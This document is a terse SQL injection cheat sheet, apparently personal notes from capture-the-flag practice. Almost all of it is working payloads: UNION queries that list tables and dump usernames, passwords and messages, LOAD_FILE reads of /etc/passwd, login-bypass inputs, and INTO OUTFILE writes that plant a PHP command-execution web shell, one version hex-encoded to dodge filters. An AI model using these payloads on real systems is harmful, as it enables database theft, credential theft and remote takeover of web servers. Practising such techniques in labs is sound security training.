# uploading File with Mysql

Basic:
```
<VALUE>' union select 1, @@version-- -
```
```
<VALUE>' union select 1, table_name FROM information_schema.tables-- -
```
```
sqlite_version()
```
> uploading:
```
<VALUE>' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY <Sting to Text"php rev shell">#
```
> then go to http://example.com/shell.php?cmd=`<exec>`

> uploading file Says 'Hello from SQLI'
```
<VALUE>'union select 1,'Hello from SQLI' INTO OUTFILE '/var/www/html/shell.php' from webapp.queue-- -
```
>then exec: `curl http://example/shell.php`
# List For Extract Data

1: 
```
12 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema = database()
```
2: 
```
12 union select 1,group_concat(username,password),3,4 from users   // select what u see in Data //
```
3: 
```
12 union select 1,group_concat(message_content),3,4 from messages    
```
> INPUT
```
# MySQL and MSSQL
',nickName=@@version,email='
# For Oracle
',nickName=(SELECT banner FROM v$version),email='
# For SQLite
',nickName=sqlite_version(),email='

(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%')
(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable')
(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable)
```
# read files
1: 
```
<VALUE>'union select 1,LOAD_FILE('/etc/passwd') from webapp.queue-- -
```
# command shell
```
<VALUE>'union select 1,'<?php system($_GET['cmd']) ?> INTO OUTFILE '/var/www/html/shell1.php' from webapp.queue-- -
```
# Payload in hex
```
local@local:~/Documents/tryhackme/yearofthedog/logs$ mysql -u root -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
mysql> select hex('<?php system($_GET["cmd"]) ?>');
+------------------------------------------------------------+
| hex('<?php system($_GET["cmd"]) ?>')                       |
+------------------------------------------------------------+
| 3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E |
+------------------------------------------------------------+
1 row in set (0.00 sec)
```
> then exec:
```
<VALUE>'union select 1,unhex('3C3F7068702073797374656D28245F4745545B22636D64225D29203F3E') INTO OUTFILE '/var/www/html/shell1.php' from webapp.queue-- -
```
# Login Page
> try those injection
```
username：admin'
password: 1
- Payload
username: admin'-- -
password: 1

<<SOON>>
```
